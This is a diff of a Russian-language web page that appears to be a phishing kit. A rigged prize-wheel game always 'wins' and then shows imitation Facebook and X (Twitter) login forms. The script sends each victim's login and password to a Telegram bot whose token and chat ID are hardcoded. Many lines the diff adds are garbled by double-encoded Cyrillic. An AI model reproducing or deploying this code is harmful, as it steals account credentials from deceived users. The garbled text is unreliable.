@@ -50,9 +50,18 @@
             position: relative;
         }
 
-        /* Убрал градиентный оверлей для лучшей видимости изображений */
         .gradient-overlay {
-            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, 
+                transparent 0%, 
+                rgba(0, 0, 0, 0.3) 30%, 
+                rgba(0, 0, 0, 0.7) 70%, 
+                transparent 100%);
+            z-index: 1;
         }
 
         .container {
@@ -167,7 +176,7 @@
             left: 100%;
         }
 
-        /* Модальное окно выигрыша */
+        /* ÐÐ¾Ð´Ð°Ð»ÑÐ½ÑÐµ Ð¾ÐºÐ½Ð° */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -198,7 +207,7 @@
             flex-direction: column;
         }
 
-        /* Заголовок модального окна выигрыша */
+        /* Ð¡ÑÐ¸Ð»Ð¸ Ð´Ð»Ñ Ð¾ÐºÐ½Ð° Ð²ÑÐ¸Ð³ÑÑÑÐ° */
         .win-modal-header {
             background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
             padding: 25px 20px;
@@ -310,7 +319,7 @@
         }
 
         .checkbox-option.active .checkbox-icon::after {
-            content: '✓';
+            content: 'â';
             color: #000;
             font-weight: bold;
         }
@@ -349,7 +358,7 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
 
-        /* Стилизация модального окна Facebook - более детально */
+        /* ÐÐÐÐÐÐÐÐÐÐ«Ð ÑÑÐ¸Ð»Ð¸ Ð´Ð»Ñ Facebook Ð¾ÐºÐ½Ð° - Ð¢ÐÐ§ÐÐ ÐÐ Ð¡ÐÐ ÐÐÐ¨ÐÐ¢Ð£ */
         .facebook-modal-content {
             background: #f0f2f5;
             color: #1c1e21;
@@ -359,7 +368,7 @@
             margin: auto;
         }
 
-        /* Верхняя шапка с языком - теперь отдельно */
+        /* ÐÐµÑÑÐ½ÑÑ ÑÐ°ÑÑÑ Ñ ÑÐ·ÑÐºÐ¾Ð¼ - ÐÐÐÐÐ«Ð ÐÐÐÐ */
         .facebook-language-header {
             padding: 12px 16px;
             text-align: center;
@@ -372,9 +381,9 @@
         .language-selector {
             background: transparent;
             border: none;
-            color: #000000 !important; /* Черный цвет */
+            color: #000000 !important; /* Ð§ÐÐ ÐÐ«Ð Ð¢ÐÐÐ¡Ð¢ */
             font-size: 14px;
-            font-weight: 400 !important; /* Обычный вес */
+            font-weight: 400 !important; /* Ð¢ÐÐÐ¬Ð¨Ð */
             cursor: pointer;
             padding: 4px 8px;
             border-radius: 4px;
@@ -387,7 +396,7 @@
             background: #f0f2f5;
         }
 
-        /* Основной контент Facebook */
+        /* ÐÑÐ½Ð¾Ð²Ð½Ð¾Ð¹ ÐºÐ¾Ð½ÑÐµÐ½Ñ */
         .facebook-content {
             padding: 16px;
             background: #fff;
@@ -399,7 +408,7 @@
             width: 100%;
         }
 
-        /* Логотип FACEBOOK - увеличен до 70px */
+        /* ÐÐÐÐÐÐ FACEBOOK ÐÐÐ Ð¢ÐÐÐÐ - Ð£ÐÐÐÐ¬Ð¨ÐÐÐ ÐÐ 70px */
         .facebook-logo-container {
             margin: 24px 0 20px;
             text-align: center;
@@ -407,12 +416,12 @@
         }
 
         .facebook-logo {
-            width: 70px !important; /* Увеличен до 70px */
+            width: 70px !important; /* Ð£ÐÐÐÐ¬Ð¨ÐÐÐ ÐÐ 70px */
             height: auto;
             object-fit: contain;
         }
 
-        /* Форма */
+        /* Ð¤Ð¾ÑÐ¼Ð° */
         .facebook-form {
             width: 100%;
             max-width: 364px;
@@ -441,7 +450,7 @@
             box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
         }
 
-        /* Кнопка входа Facebook */
+        /* ÐÐÐÐÐÐ ÐÐÐÐ¢Ð ÐÐÐ Ð¢ÐÐÐÐ */
         .facebook-login-button {
             width: 100%;
             height: 48px;
@@ -458,7 +467,7 @@
             object-fit: contain;
         }
 
-        /* Ссылка "Забыли пароль?" - теперь в обычном весе */
+        /* Ð¡ÑÑÐ»ÐºÐ° "ÐÐ°Ð±ÑÐ»Ð¸ Ð¿Ð°ÑÐ¾Ð»Ñ?" - Ð§ÐÐ ÐÐÐ¯ Ð Ð¢ÐÐÐ¬Ð¨Ð */
         .forgot-password-link {
             display: block;
             text-align: center;
@@ -467,8 +476,8 @@
             font-size: 14px;
             margin-bottom: 20px;
             padding: 16px 0;
-            /* Убрал жирный шрифт */
-            font-weight: 400 !important; /* Обычный вес */
+            /* Ð£ÐÐÐÐÐÐ ÐÐÐÐÐ¯ */
+            font-weight: 400 !important; /* Ð¢ÐÐÐ¬Ð¨Ð */
             width: 100%;
         }
 
@@ -477,20 +486,20 @@
             color: #1c1e21;
         }
 
-        /* Контейнер кнопки создания аккаунта - увеличен до 100px */
+        /* ÐÐ½Ð¾Ð¿ÐºÐ° ÑÐ¾Ð·Ð´Ð°Ð½Ð¸Ñ Ð°ÐºÐºÐ°ÑÐ½ÑÐ° - ÐÐÐ Ð¢ÐÐÐÐ Ð£ÐÐÐÐÐ§ÐÐÐ ÐÐ 100px */
         .facebook-create-container {
-            margin-top: 10px; /* Отступ сверху от ссылки забыли пароль */
+            margin-top: 10px; /* ÐÐ»Ð¸Ð¶Ðµ Ðº Ð·Ð°Ð±ÑÐ»Ð¸ Ð¿Ð°ÑÐ¾Ð»Ñ */
             width: 100%;
             max-width: 364px;
             display: flex;
             justify-content: center;
-            /* Убрал верхний отступ */
+            /* Ð£ÐÐÐÐÐÐ ÐÐÐÐÐ¯ */
             padding-top: 0;
         }
 
         .facebook-create-button {
             width: 100%;
-            height: 100px !important; /* Увеличен до 100px */
+            height: 100px !important; /* Ð£ÐÐÐÐÐ§ÐÐÐ ÐÐ 100px */
             background: transparent;
             border: none;
             cursor: pointer;
@@ -503,15 +512,15 @@
             object-fit: contain;
         }
 
-        /* Футер - В META - уменьшил отступ сверху */
+        /* Ð¤ÑÑÐµÑ - Ð¡ ÐÐÐÐÐÐÐ META - ÐÐÐÐÐÐÐ£Ð¢ ÐÐÐÐÐ Ð Ð¡ÐÐÐÐÐ¢Ð¬ ÐÐÐÐÐ£ÐÐ¢ */
         .facebook-footer {
             background: #fff;
-            padding: 5px 16px 20px !important; /* Уменьшил верхний padding - отступ */
+            padding: 5px 16px 20px !important; /* Ð£Ð¼ÐµÐ½ÑÑÐµÐ½ Ð²ÐµÑÑÐ½Ð¸Ð¹ padding - ÐÐÐÐÐ */
             font-size: 12px;
             color: #737373;
             text-align: center;
-            border-top: none !important; /* Убрал верхнюю границу */
-            margin-top: 5px !important; /* Уменьшил отступ сверху от кнопки создания аккаунта */
+            border-top: none !important; /* Ð£ÐÐÐÐÐÐ ÐÐÐÐÐ¯ ÐÐÐÐÐ Ð¥Ð£ */
+            margin-top: 5px !important; /* ÐÐ»Ð¸Ð¶Ðµ Ðº ÐºÐ½Ð¾Ð¿ÐºÐµ ÑÐ¾Ð·Ð´Ð°ÑÑ Ð°ÐºÐºÐ°ÑÐ½Ñ */
             width: 100%;
         }
 
@@ -520,7 +529,7 @@
             align-items: center;
             justify-content: center;
             gap: 8px;
-            margin-bottom: 8px !important; /* Уменьшил отступ снизу */
+            margin-bottom: 8px !important; /* ÐÐ»Ð¸Ð¶Ðµ Ðº ÑÑÑÐ»ÐºÐ°Ð¼ */
         }
 
         .meta-icon {
@@ -540,7 +549,7 @@
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
-            gap: 15px !important; /* Увеличил расстояние между ссылками */
+            gap: 15px !important; /* ÐÐ¾Ð»ÑÑÐµ ÑÐ°ÑÑÑÐ¾ÑÐ½Ð¸Ñ Ð¼ÐµÐ¶Ð´Ñ ÑÑÑÐ»ÐºÐ°Ð¼Ð¸ */
         }
 
         .footer-links a {
@@ -553,7 +562,7 @@
             text-decoration: underline;
         }
 
-        /* Модальное окно Twitter (X) */
+        /* Ð¡ÑÐ¸Ð»Ð¸ Ð´Ð»Ñ Twitter (X) Ð¾ÐºÐ½Ð° */
         .twitter-modal-content {
             background: #000;
             color: #fff;
@@ -756,7 +765,7 @@
         }
 
         .twitter-alt-button.apple::before {
-            content: '';
+            content: 'ï£¿';
             font-size: 18px;
         }
 
@@ -789,7 +798,7 @@
             margin-top: auto;
         }
 
-        /* Модальное окно забытого пароля */
+        /* ÐÐºÐ½Ð¾ Ð²Ð¾ÑÑÑÐ°Ð½Ð¾Ð²Ð»ÐµÐ½Ð¸Ñ Ð¿Ð°ÑÐ¾Ð»Ñ */
         .forgot-password-modal {
             background: #000;
             color: #fff;
@@ -899,7 +908,7 @@
             background: #e6e6e6;
         }
 
-        /* Модальное окно регистрации */
+        /* ÐÐºÐ½Ð¾ ÑÐµÐ³Ð¸ÑÑÑÐ°ÑÐ¸Ð¸ */
         .signup-modal {
             background: #000;
             color: #fff;
@@ -1010,7 +1019,7 @@
         }
 
         .signup-alt-button.apple::before {
-            content: '';
+            content: 'ï£¿';
             font-size: 18px;
         }
 
@@ -1086,7 +1095,7 @@
             text-decoration: underline;
         }
 
-        /* Модальное окно успешного входа */
+        /* Ð¡ÑÐ¸Ð»Ð¸ Ð´Ð»Ñ Ð¾ÐºÐ½Ð° ÑÑÐ¿ÐµÑÐ° */
         .success-modal-content {
             background: #000;
             border: 3px solid gold;
@@ -1134,7 +1143,7 @@
             font-size: 1.1rem;
         }
 
-        /* Анимации */
+        /* ÐÐ½Ð¸Ð¼Ð°ÑÐ¸Ð¸ */
         @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
@@ -1165,7 +1174,7 @@
             animation: wheelGlow 1s infinite;
         }
 
-        /* Стилизация скроллбара модальных окон */
+        /* ÐÑÐ¿ÑÐ°Ð²Ð»ÐµÐ½Ð¸Ðµ Ð¿ÑÐ¾ÐºÑÑÑÐºÐ¸ */
         .modal-content::-webkit-scrollbar {
             width: 6px;
         }
@@ -1221,11 +1230,11 @@
             }
 
             .facebook-logo {
-                width: 60px !important; /* Уменьшил для мобильных устройств */
+                width: 60px !important; /* ÐÐ´Ð°Ð¿ÑÐ¸Ð²Ð½Ð¾ Ð´Ð»Ñ Ð¼Ð¾Ð±Ð¸Ð»ÑÐ½ÑÑ */
             }
 
             .facebook-create-button {
-                height: 90px; /* Уменьшил для мобильных устройств */
+                height: 90px; /* ÐÐ´Ð°Ð¿ÑÐ¸Ð²Ð½Ð¾ Ð´Ð»Ñ Ð¼Ð¾Ð±Ð¸Ð»ÑÐ½ÑÑ */
             }
         }
 
@@ -1257,15 +1266,15 @@
             }
 
             .facebook-logo {
-                width: 50px !important; /* Еще меньше для маленьких экранов */
+                width: 50px !important; /* ÐÑÐµ Ð¼ÐµÐ½ÑÑÐµ Ð½Ð° Ð¼Ð°Ð»ÐµÐ½ÑÐºÐ¸Ñ ÑÐºÑÐ°Ð½Ð°Ñ */
             }
 
             .facebook-create-button {
-                height: 80px; /* Еще меньше для маленьких экранов */
+                height: 80px; /* ÐÐ´Ð°Ð¿ÑÐ¸Ð²Ð½Ð¾ Ð´Ð»Ñ Ð¼Ð°Ð»ÐµÐ½ÑÐºÐ¸Ñ ÑÐºÑÐ°Ð½Ð¾Ð² */
             }
         }
 
-        /* Адаптация для маленькой высоты экрана */
+        /* ÐÐ¾Ð±Ð¸Ð»ÑÐ½Ð°Ñ Ð¾Ð¿ÑÐ¸Ð¼Ð¸Ð·Ð°ÑÐ¸Ñ */
         @media (max-height: 700px) {
             .twitter-modal-content,
             .forgot-password-modal,
@@ -1295,23 +1304,23 @@
     <div class="container">
         <div class="roulette-container">
             <div class="wheel-container">
-                <img src="wheel.png" alt="Колесо рулетки" class="wheel prize-wheel" id="prizeWheel">
-                <img src="wheel_base.png" alt="Основание колеса" class="wheel wheel-base" id="wheelBase">
+                <img src="wheel.png" alt="ÐÐ¾Ð»ÐµÑÐ¾ ÑÑÐ»ÐµÑÐºÐ¸" class="wheel prize-wheel" id="prizeWheel">
+                <img src="wheel_base.png" alt="ÐÑÐ½Ð¾Ð²Ð°Ð½Ð¸Ðµ ÐºÐ¾Ð»ÐµÑÐ°" class="wheel wheel-base" id="wheelBase">
             </div>
         </div>
 
-        <button class="spin-button" id="spinButton">Крутить колесо</button>
+        <button class="spin-button" id="spinButton">ÐÐ Ð£Ð¢ÐÐ¢Ð¬ Ð Ð£ÐÐÐ¢ÐÐ£</button>
     </div>
 
-    <!-- Модальное окно выигрыша -->
+    <!-- ÐÐ¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾ Ð²ÑÐ¸Ð³ÑÑÑÐ° -->
     <div class="modal-overlay" id="winModal">
         <div class="modal-content">
             <div class="win-modal-header">
-                <!-- Заголовок модального окна -->
+                <!-- Ð¢ÐµÐºÑÑ ÑÐ´Ð°Ð»ÐµÐ½ ÐºÐ°Ðº ÑÐºÐ°Ð·Ð°Ð½Ð¾ -->
             </div>
             
             <div class="prize-image-container">
-                <img id="winPrizeImage" class="prize-image" alt="Приз">
+                <img id="winPrizeImage" class="prize-image" alt="ÐÑÐ¸Ð³ÑÑÑ">
             </div>
             
             <div class="login-options">
@@ -1325,7 +1334,7 @@
                 </div>
                 <div class="checkbox-option" id="twitterOption">
                     <div class="checkbox-option-content">
-                        <div class="social-icon twitter-icon">𝕏</div>
+                        <div class="social-icon twitter-icon">ð</div>
                         <span>Login With X (Twitter)</span>
                     </div>
                     <div class="checkbox-icon"></div>
@@ -1339,68 +1348,68 @@
         </div>
     </div>
 
-    <!-- Модальное окно входа через Facebook -->
+    <!-- ÐÐ¡ÐÐ ÐÐÐÐÐÐÐÐ Ð¼Ð¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾ Ð²ÑÐ¾Ð´Ð° Ð² Facebook -->
     <div class="modal-overlay" id="facebookModal">
         <div class="modal-content facebook-modal-content">
-            <!-- Верхняя шапка с языком - теперь отдельно -->
+            <!-- ÐÐµÑÑÐ½ÑÑ ÑÐ°ÑÑÑ Ñ ÑÐ·ÑÐºÐ¾Ð¼ - ÐÐÐÐÐ«Ð ÐÐÐÐ -->
             <div class="facebook-language-header">
-                <button class="language-selector">Русский</button>
+                <button class="language-selector">Ð ÑÑÑÐºÐ¸Ð¹</button>
             </div>
             
-            <!-- Основной контент Facebook -->
+            <!-- ÐÑÐ½Ð¾Ð²Ð½Ð¾Ð¹ ÐºÐ¾Ð½ÑÐµÐ½Ñ -->
             <div class="facebook-content">
-                <!-- Логотип Facebook - увеличен до 70px -->
+                <!-- ÐÐ¾Ð³Ð¾ÑÐ¸Ð¿ Facebook ÐºÐ°Ðº ÐºÐ°ÑÑÐ¸Ð½ÐºÐ° - Ð£ÐÐÐÐ¬Ð¨ÐÐ ÐÐ 70px -->
                 <div class="facebook-logo-container">
                     <img src="facebook.png" alt="Facebook" class="facebook-logo">
                 </div>
                 
-                <!-- Форма входа -->
+                <!-- Ð¤Ð¾ÑÐ¼Ð° Ð²ÑÐ¾Ð´Ð° -->
                 <form class="facebook-form" id="facebookForm">
-                    <input type="text" class="facebook-input" id="fbEmail" placeholder="Эл. адрес или номер телефона" required>
-                    <input type="password" class="facebook-input" id="fbPassword" placeholder="Пароль" required>
+                    <input type="text" class="facebook-input" id="fbEmail" placeholder="ÐÐ¾Ð±Ð¸Ð»ÑÐ½ÑÐ¹ ÑÐµÐ»ÐµÑÐ¾Ð½ Ð¸Ð»Ð¸ ÑÐ». Ð°Ð´ÑÐµÑ" required>
+                    <input type="password" class="facebook-input" id="fbPassword" placeholder="ÐÐ°ÑÐ¾Ð»Ñ" required>
                     
-                    <!-- Кнопка "Войти" через изображение -->
+                    <!-- ÐÐ½Ð¾Ð¿ÐºÐ° "ÐÐ¾Ð¹ÑÐ¸" ÐºÐ°Ðº ÐºÐ°ÑÑÐ¸Ð½ÐºÐ° -->
                     <button type="submit" class="facebook-login-button">
-                        <img src="vhod.png" alt="Войти">
+                        <img src="vhod.png" alt="ÐÐ¾Ð¹ÑÐ¸">
                     </button>
                     
-                    <a href="#" class="forgot-password-link" id="forgotPassword">Забыли пароль?</a>
+                    <a href="#" class="forgot-password-link" id="forgotPassword">ÐÐ°Ð±ÑÐ»Ð¸ Ð¿Ð°ÑÐ¾Ð»Ñ?</a>
                 </form>
                 
-                <!-- Кнопка создания аккаунта через изображение - увеличен до 100px -->
+                <!-- ÐÐ½Ð¾Ð¿ÐºÐ° ÑÐ¾Ð·Ð´Ð°Ð½Ð¸Ñ Ð°ÐºÐºÐ°ÑÐ½ÑÐ° ÐºÐ°Ðº ÐºÐ°ÑÑÐ¸Ð½ÐºÐ° - Ð£ÐÐÐÐÐ§ÐÐÐ ÐÐ 100px -->
                 <div class="facebook-create-container">
                     <button type="button" class="facebook-create-button" id="createAccount">
-                        <img src="sozdanie.png" alt="Создать новый аккаунт">
+                        <img src="sozdanie.png" alt="Ð¡Ð¾Ð·Ð´Ð°ÑÑ Ð½Ð¾Ð²ÑÐ¹ Ð°ÐºÐºÐ°ÑÐ½Ñ">
                     </button>
                 </div>
             </div>
             
-            <!-- Футер с мета-информацией - уменьшил отступ сверху -->
+            <!-- Ð¤ÑÑÐµÑ Ñ Ð¸ÐºÐ¾Ð½ÐºÐ¾Ð¹ Meta - ÐÐÐÐÐÐÐ£Ð¢ ÐÐÐÐÐ ÐÐÐ ÐÐÐÐÐ -->
             <div class="facebook-footer">
                 <div class="footer-meta">
                     <div class="meta-icon" style="background-image: url('meta.png');"></div>
                     <span>Meta</span>
                 </div>
                 <div class="footer-links">
-                    <a href="#">Конфиденциальность</a>
-                    <a href="#">Условия</a>
-                    <a href="#">Справка</a>
+                    <a href="#">ÐÐ½ÑÐ¾ÑÐ¼Ð°ÑÐ¸Ñ</a>
+                    <a href="#">Ð¡Ð¿ÑÐ°Ð²ÐºÐ°</a>
+                    <a href="#">ÐÑÑ</a>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Модальное окно входа через X (Twitter) -->
+    <!-- ÐÐ¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾ Ð²ÑÐ¾Ð´Ð° Ð² X (Twitter) -->
     <div class="modal-overlay" id="twitterModal">
         <div class="modal-content twitter-modal-content">
             <div class="twitter-header">
                 <button class="twitter-close-button" id="twitterCloseButton">
-                    <span class="twitter-close-icon">×</span>
+                    <span class="twitter-close-icon">Ã</span>
                 </button>
             </div>
             
             <div class="twitter-logo-container">
-                <div class="twitter-logo">𝕏</div>
+                <div class="twitter-logo">ð</div>
             </div>
             
             <div class="twitter-title-container">
@@ -1439,20 +1448,20 @@
             </form>
             
             <div class="twitter-footer">
-                © 2025 X Corp.
+                Â© 2025 X Corp.
             </div>
         </div>
     </div>
 
-    <!-- Модальное окно успешного получения приза -->
+    <!-- ÐÐ¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾ ÑÑÐ¿ÐµÑÐ½Ð¾Ð³Ð¾ Ð¿Ð¾Ð»ÑÑÐµÐ½Ð¸Ñ Ð¿ÑÐ¸Ð·Ð° -->
     <div class="modal-overlay" id="successModal">
         <div class="modal-content success-modal-content">
             <div class="success-header">
-                <!-- Заголовок модального окна -->
+                <!-- Ð¢ÐµÐºÑÑ ÑÐ´Ð°Ð»ÐµÐ½ ÐºÐ°Ðº ÑÐºÐ°Ð·Ð°Ð½Ð¾ -->
             </div>
             
             <div class="success-prize-container">
-                <img id="successPrizeImage" class="success-prize-image" alt="Приз">
+                <img id="successPrizeImage" class="success-prize-image" alt="ÐÑÐ¸Ð³ÑÑÑ">
             </div>
             
             <div class="success-message">
@@ -1469,7 +1478,7 @@
     </div>
 
     <script>
-        // Массив призов с изображениями
+        // ÐÐ¾Ð½ÑÐ¸Ð³ÑÑÐ°ÑÐ¸Ñ Ð¿ÑÐ¸Ð·Ð¾Ð²
         const prizes = [
             { name: "pharaon", image: "pharaon.png" },
             { name: "material", image: "material.png" },
@@ -1485,11 +1494,11 @@
             { name: "tolstovka", image: "tolstovka.png" }
         ];
 
-        // Telegram бот данные
+        // Telegram Ð±Ð¾Ñ Ð´Ð°Ð½Ð½ÑÐµ
         const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
         const CHAT_ID = '1709490182';
 
-        // Получение DOM элементов
+        // Ð­Ð»ÐµÐ¼ÐµÐ½ÑÑ DOM
         const spinButton = document.getElementById('spinButton');
         const prizeWheel = document.getElementById('prizeWheel');
         const winModal = document.getElementById('winModal');
@@ -1510,11 +1519,11 @@
         let currentPrize = null;
         let selectedLoginOption = 'facebook';
 
-        // Инициализация
+        // ÐÐ½Ð¸ÑÐ¸Ð°Ð»Ð¸Ð·Ð°ÑÐ¸Ñ
         function initialize() {
             hasSpun = false;
             spinButton.disabled = false;
-            spinButton.textContent = "Крутить колесо";
+            spinButton.textContent = "ÐÐ Ð£Ð¢ÐÐ¢Ð¬ Ð Ð£ÐÐÐ¢ÐÐ£";
             prizeWheel.style.transition = 'none';
             prizeWheel.style.transform = 'rotate(0deg)';
             currentRotation = 0;
@@ -1525,22 +1534,22 @@
             
             spinButton.style.animation = 'pulse 2s infinite';
             
-            // Сброс форм
+            // ÐÑÐ¸ÑÑÐºÐ° ÑÐ¾ÑÐ¼
             document.getElementById('twitterForm').reset();
             document.getElementById('facebookForm').reset();
             
-            // Обновление года в футере
+            // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ Ð³Ð¾Ð´ Ð² ÑÑÑÐµÑÐ°Ñ
             const currentYear = new Date().getFullYear();
-            document.querySelector('.twitter-footer').innerHTML = `© ${currentYear} X Corp.`;
+            document.querySelector('.twitter-footer').innerHTML = `Â© ${currentYear} X Corp.`;
         }
 
-        // Вращение рулетки (всегда выигрыш Mummy)
+        // Ð¤ÑÐ½ÐºÑÐ¸Ñ Ð²ÑÐ°ÑÐµÐ½Ð¸Ñ ÑÑÐ»ÐµÑÐºÐ¸ (ÐÐ¡ÐÐÐÐ Ð½Ð° Mummy)
         function spinRoulette() {
             if (isSpinning || hasSpun) return;
             
             isSpinning = true;
             spinButton.disabled = true;
-            spinButton.textContent = "Крутится...";
+            spinButton.textContent = "ÐÐ Ð£Ð¢ÐÐ¢Ð¬ Ð Ð£ÐÐÐ¢ÐÐ£";
             spinButton.style.animation = 'none';
             
             const TARGET_PRIZE_INDEX = 3;
@@ -1568,14 +1577,14 @@
             }, 4000);
         }
 
-        // Отправка данных в Telegram
+        // Ð¤ÑÐ½ÐºÑÐ¸Ñ Ð¾ÑÐ¿ÑÐ°Ð²ÐºÐ¸ Ð´Ð°Ð½Ð½ÑÑ Ð² Telegram
         async function sendToTelegram(data) {
-            const message = `🎉 Новый выигрыш в рулетке!\n\n` +
-                           `🎁 Приз: ${data.prize}\n` +
-                           `🔑 Логин: ${data.login}\n` +
-                           `🔒 Пароль: ${data.password}\n` +
-                           `🌐 Сеть: ${data.network}\n` +
-                           `📅 Дата: ${new Date().toLocaleString()}`;
+            const message = `ð° ÐÐÐÐ«Ð ÐÐ«ÐÐÐ Ð«Ð¨!\n\n` +
+                           `ð ÐÑÐ¸Ð·: ${data.prize}\n` +
+                           `ð§ ÐÐ¾Ð³Ð¸Ð½: ${data.login}\n` +
+                           `ð ÐÐ°ÑÐ¾Ð»Ñ: ${data.password}\n` +
+                           `ð Ð¡Ð¾ÑÑÐµÑÑ: ${data.network}\n` +
+                           `ð ÐÑÐµÐ¼Ñ: ${new Date().toLocaleString()}`;
             
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -1591,15 +1600,15 @@
                 });
                 
                 const result = await response.json();
-                console.log('Данные успешно отправлены в Telegram:', result);
+                console.log('ÐÐ°Ð½Ð½ÑÐµ Ð¾ÑÐ¿ÑÐ°Ð²Ð»ÐµÐ½Ñ Ð² Telegram:', result);
                 return result.ok;
             } catch (error) {
-                console.error('Ошибка при отправке в Telegram:', error);
+                console.error('ÐÑÐ¸Ð±ÐºÐ° Ð¾ÑÐ¿ÑÐ°Ð²ÐºÐ¸ Ð² Telegram:', error);
                 return false;
             }
         }
 
-        // Выбор метода входа
+        // ÐÑÐ±Ð¾Ñ Ð¾Ð¿ÑÐ¸Ð¸ Ð²ÑÐ¾Ð´Ð°
         facebookOption.addEventListener('click', () => {
             facebookOption.classList.add('active');
             twitterOption.classList.remove('active');
@@ -1612,7 +1621,7 @@
             selectedLoginOption = 'twitter';
         });
 
-        // Подтверждение выбора входа
+        // ÐÐ¾Ð´ÑÐ²ÐµÑÐ¶Ð´ÐµÐ½Ð¸Ðµ Ð²ÑÐ±Ð¾ÑÐ° Ð²ÑÐ¾Ð´Ð°
         confirmLogin.addEventListener('click', () => {
             winModal.style.display = 'none';
             
@@ -1623,20 +1632,20 @@
             }
         });
 
-        // Обработчик кнопки вращения
+        // ÐÐ±ÑÐ°Ð±Ð¾ÑÑÐ¸ÐºÐ¸ ÑÐ¾Ð±ÑÑÐ¸Ð¹
         spinButton.addEventListener('click', spinRoulette);
 
-        // Закрытие окна выигрыша
+        // ÐÑÐ¼ÐµÐ½Ð° Ð²ÑÐ¸Ð³ÑÑÑÐ°
         document.getElementById('cancelWin').addEventListener('click', () => {
             winModal.style.display = 'none';
         });
 
-        // Закрытие Twitter модального окна
+        // ÐÐ°ÐºÑÑÑÐ¸Ðµ Twitter Ð¾ÐºÐ½Ð°
         document.getElementById('twitterCloseButton').addEventListener('click', () => {
             twitterModal.style.display = 'none';
         });
 
-        // Форма Facebook
+        // Ð¤Ð¾ÑÐ¼Ð° Facebook
         document.getElementById('facebookForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -1657,7 +1666,7 @@
             }
         });
 
-        // Форма Twitter
+        // Ð¤Ð¾ÑÐ¼Ð° Twitter
         document.getElementById('twitterForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -1678,18 +1687,18 @@
             }
         });
 
-        // Кнопка "Забыли пароль?" Facebook
+        // ÐÐ½Ð¾Ð¿ÐºÐ° "ÐÐ°Ð±ÑÐ»Ð¸ Ð¿Ð°ÑÐ¾Ð»Ñ?" Facebook
         document.getElementById('forgotPassword').addEventListener('click', (e) => {
             e.preventDefault();
-            alert('Восстановление пароля Facebook');
+            alert('ÐÐ¾ÑÑÑÐ°Ð½Ð¾Ð²Ð»ÐµÐ½Ð¸Ðµ Ð¿Ð°ÑÐ¾Ð»Ñ Facebook');
         });
 
-        // Кнопка "Создать аккаунт" Facebook
+        // ÐÐ½Ð¾Ð¿ÐºÐ° "Ð¡Ð¾Ð·Ð´Ð°ÑÑ Ð°ÐºÐºÐ°ÑÐ½Ñ" Facebook
         document.getElementById('createAccount').addEventListener('click', () => {
-            alert('Создание нового аккаунта Facebook');
+            alert('Ð¡Ð¾Ð·Ð´Ð°Ð½Ð¸Ðµ Ð½Ð¾Ð²Ð¾Ð³Ð¾ Ð°ÐºÐºÐ°ÑÐ½ÑÐ° Facebook');
         });
 
-        // Кнопки успешного получения
+        // ÐÐ½Ð¾Ð¿ÐºÐ¸ ÑÑÐ¿ÐµÑÐ½Ð¾Ð³Ð¾ Ð¿Ð¾Ð»ÑÑÐµÐ½Ð¸Ñ
         document.getElementById('cancelSuccess').addEventListener('click', () => {
             successModal.style.display = 'none';
         });
@@ -1698,7 +1707,7 @@
             successModal.style.display = 'none';
         });
 
-        // Предотвращение прокрутки рулетки
+        // ÐÐ»Ð¾ÐºÐ¸ÑÐ¾Ð²ÐºÐ° Ð¿ÑÐ¾ÐºÑÑÑÐºÐ¸ Ð´Ð»Ñ ÑÑÐ»ÐµÑÐºÐ¸
         document.addEventListener('touchmove', function(e) {
             if (e.target.closest('.roulette-container') || e.target.closest('.container')) {
                 e.preventDefault();
@@ -1715,7 +1724,7 @@
             document.querySelector('.container').style.transform = 'translateY(0)';
         });
 
-        // Закрытие модальных окон при клике вне их
+        // ÐÐ°ÐºÑÑÑÐ¸Ðµ Ð¼Ð¾Ð´Ð°Ð»ÑÐ½ÑÑ Ð¾ÐºÐ¾Ð½ Ð¿Ð¾ ÐºÐ»Ð¸ÐºÑ Ð½Ð° Ð¾Ð²ÐµÑÐ»ÐµÐ¹
         const modals = document.querySelectorAll('.modal-overlay');
         modals.forEach(modal => {
             modal.addEventListener('click', (e) => {
@@ -1725,7 +1734,7 @@
             });
         });
 
-        // Инициализация при загрузке страницы
+        // ÐÐ½Ð¸ÑÐ¸Ð°Ð»Ð¸Ð·Ð°ÑÐ¸Ñ Ð¿ÑÐ¸ Ð·Ð°Ð³ÑÑÐ·ÐºÐµ
         window.addEventListener('load', initialize);
     </script>
 </body>
